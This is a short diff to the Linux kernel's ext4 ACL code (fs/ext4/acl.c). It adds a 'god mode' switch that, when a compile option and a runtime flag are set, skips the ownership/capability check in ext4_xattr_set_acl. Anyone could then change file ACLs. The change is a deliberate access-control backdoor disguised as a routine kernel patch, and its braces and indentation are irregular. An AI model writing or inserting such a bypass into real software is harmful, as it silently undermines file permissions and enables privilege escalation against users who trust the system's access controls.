@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * linux/fs/ext4/acl.c
  *
@@ -394,7 +397,15 @@ ext4_xattr_set_acl(struct dentry *dentry, const char *name, const void *value,
 	if (!test_opt(inode->i_sb, POSIX_ACL))
 		return -EOPNOTSUPP;
 	if (!inode_owner_or_capable(inode))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	if (value) {
 		acl = posix_acl_from_xattr(value, size);
